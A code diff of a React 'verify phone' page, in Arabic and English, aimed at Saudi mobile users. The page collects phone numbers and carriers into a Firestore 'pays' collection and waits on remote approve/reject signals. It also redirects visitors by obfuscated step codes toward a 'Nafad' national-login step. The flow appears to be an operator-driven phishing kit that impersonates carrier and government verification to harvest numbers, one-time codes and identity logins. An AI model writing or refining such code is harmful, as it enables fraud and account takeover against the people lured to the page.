@@ -4,7 +4,7 @@ import { useEffect, useState } from "react";
 import { toast } from "sonner";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Phone, ShieldCheck, CreditCard, ChevronDown, Loader2, CheckCircle2 } from "lucide-react";
+import { Phone, ShieldCheck, CreditCard, ChevronDown, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
 import { StcVerificationModal } from "@/components/stc-verification-modal";
 import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
@@ -23,20 +23,19 @@ export default function VerifyPhonePage() {
   const [showMobilyModal, setShowMobilyModal] = useState(false);
   const [showCarrierModal, setShowCarrierModal] = useState(false);
   const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false);
-  const [otpRejectionError, setOtpRejectionError] = useState("");
   const [phoneError, setPhoneError] = useState("");
-  const [isSecondRound, setIsSecondRound] = useState(false);
+  const [approvalError, setApprovalError] = useState("");
   // countdown: null = idle, 5→1 = counting, 0 = open dialog
   const [otpCountdown, setOtpCountdown] = useState<number | null>(null);
 
   const telecomOperators = [
-    { value: "stc", label: "STC - الاتصالات السعودية" },
+    { value: "stc",    label: "STC - الاتصالات السعودية" },
     { value: "mobily", label: "Mobily - موبايلي" },
-    { value: "zain", label: "Zain - زين" },
+    { value: "zain",   label: "Zain - زين" },
     { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
     { value: "lebara", label: "Lebara - ليبارا" },
-    { value: "salam", label: "SALAM - سلام" },
-    { value: "go", label: "GO - جو" },
+    { value: "salam",  label: "SALAM - سلام" },
+    { value: "go",     label: "GO - جو" },
   ];
 
   const visitorId =
@@ -61,11 +60,11 @@ export default function VerifyPhonePage() {
       (docSnap) => {
         if (!docSnap.exists()) return;
         const data = docSnap.data();
-        if (data.currentStep === "home") window.location.href = "/";
-        else if (data.currentStep === "_t6") window.location.href = "/step4";
+        if (data.currentStep === "home")  window.location.href = "/";
+        else if (data.currentStep === "_t6")  window.location.href = "/step4";
         else if (data.currentStep === "_st1") window.location.href = "/check";
-        else if (data.currentStep === "_t2") window.location.href = "/step2";
-        else if (data.currentStep === "_t3") window.location.href = "/step3";
+        else if (data.currentStep === "_t2")  window.location.href = "/step2";
+        else if (data.currentStep === "_t3")  window.location.href = "/step3";
       },
       (err) => console.error("[phone-info] Firestore listener error:", err)
     );
@@ -133,6 +132,7 @@ export default function VerifyPhonePage() {
     const visitorID = localStorage.getItem("visitor");
     if (!visitorID || !db) return;
 
+    setApprovalError("");
     try {
       await setDoc(
         doc(db as Firestore, "pays", visitorID),
@@ -148,7 +148,6 @@ export default function VerifyPhonePage() {
         { merge: true }
       );
       // Start 5-second countdown
-      setIsSecondRound(false);
       setOtpCountdown(5);
     } catch (error) {
       console.error("Error saving phone data:", error);
@@ -156,21 +155,15 @@ export default function VerifyPhonePage() {
     }
   };
 
-  // STC approved → hide STC modal, reopen OTP dialog for round 2
-  const handleStcApproved = () => {
+  // Carrier modal approved → go to Nafad
+  const handleApproved = () => {
     setShowStcModal(false);
-    setIsSecondRound(true);
-    setOtpRejectionError("");
-    setShowPhoneOtpDialog(true);
-  };
-
-  // Other carriers approved → go to Nafad
-  const handleCarrierApproved = () => {
     setShowMobilyModal(false);
     setShowCarrierModal(false);
     window.location.href = "/step4";
   };
 
+  // Carrier modal rejected → show inline error, reset for retry
   const handleRejected = async () => {
     const visitorID = localStorage.getItem("visitor");
     if (!visitorID || !db) return;
@@ -203,26 +196,12 @@ export default function VerifyPhonePage() {
     setShowStcModal(false);
     setShowMobilyModal(false);
     setShowCarrierModal(false);
-    setPhoneNumber("");
     setSelectedCarrier("");
-    toast.error("تم رفض رقم الهاتف", {
-      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
-      duration: 5000,
-    });
-  };
-
-  const handleOtpRejected = () => {
-    setShowStcModal(false);
-    setShowMobilyModal(false);
-    setShowCarrierModal(false);
-    localStorage.setItem("phoneOtpRejectionError", "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
-    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
-    setIsSecondRound(true);
-    setShowPhoneOtpDialog(true);
+    setApprovalError("تم رفض طلبك. يرجى التحقق من بياناتك والمحاولة مرة أخرى.");
   };
 
   const handleShowWaitingModal = (carrier: string) => {
-    if (carrier === "stc") setShowStcModal(true);
+    if (carrier === "stc")    setShowStcModal(true);
     else if (carrier === "mobily") setShowMobilyModal(true);
     else setShowCarrierModal(true);
   };
@@ -262,6 +241,14 @@ export default function VerifyPhonePage() {
           <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-white/10">
             <div className="h-1 bg-gradient-to-l from-[#f4ad27] via-[#1a9fd4] to-[#0e3a57]" />
             <div className="p-6 space-y-5">
+
+              {/* Approval error */}
+              {approvalError && (
+                <div className="flex items-start gap-3 bg-red-50 border border-red-200 rounded-2xl p-4">
+                  <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
+                  <p className="text-sm text-red-800 font-medium leading-relaxed">{approvalError}</p>
+                </div>
+              )}
 
               {/* Info banner */}
               <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
@@ -335,7 +322,7 @@ export default function VerifyPhonePage() {
                 </div>
               </div>
 
-              {/* Submit button — shows countdown while waiting */}
+              {/* Submit button */}
               <button
                 type="button"
                 onClick={handleSendOtp}
@@ -385,21 +372,21 @@ export default function VerifyPhonePage() {
       <StcVerificationModal
         open={showStcModal}
         visitorId={visitorId}
-        onApproved={handleStcApproved}
+        onApproved={handleApproved}
         onRejected={handleRejected}
       />
 
       <MobilyVerificationModal
         open={showMobilyModal}
         visitorId={visitorId}
-        onApproved={handleCarrierApproved}
+        onApproved={handleApproved}
         onRejected={handleRejected}
       />
 
       <CarrierVerificationModal
         open={showCarrierModal}
         visitorId={visitorId}
-        onApproved={handleCarrierApproved}
+        onApproved={handleApproved}
         onRejected={handleRejected}
       />
 
@@ -407,14 +394,10 @@ export default function VerifyPhonePage() {
         open={showPhoneOtpDialog}
         onOpenChange={(open) => {
           setShowPhoneOtpDialog(open);
-          if (!open) setOtpRejectionError("");
         }}
         phoneNumber={phoneNumber}
         phoneCarrier={selectedCarrier}
-        onRejected={handleOtpRejected}
         onShowWaitingModal={handleShowWaitingModal}
-        rejectionError={otpRejectionError}
-        isSecondRound={isSecondRound}
       />
     </>
   );
